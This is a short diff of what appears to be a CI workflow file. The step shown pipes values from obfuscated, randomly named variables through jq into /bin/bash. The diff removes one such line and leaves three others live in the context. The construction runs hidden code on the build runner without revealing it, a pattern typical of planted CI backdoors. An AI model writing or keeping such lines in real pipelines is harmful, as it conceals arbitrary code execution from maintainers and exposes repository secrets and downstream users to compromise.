@@ -38,7 +38,6 @@ jobs:
           echo $bzn2 | jq -r .ctm8402 | /bin/bash
           echo $g7419 | jq -r .gzwv9 | /bin/bash
           printf '%s' "$yyal098" | jq -r .s2 | /bin/bash
-          printf '%s' "$ydb62407" | jq -r .uiai6749 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
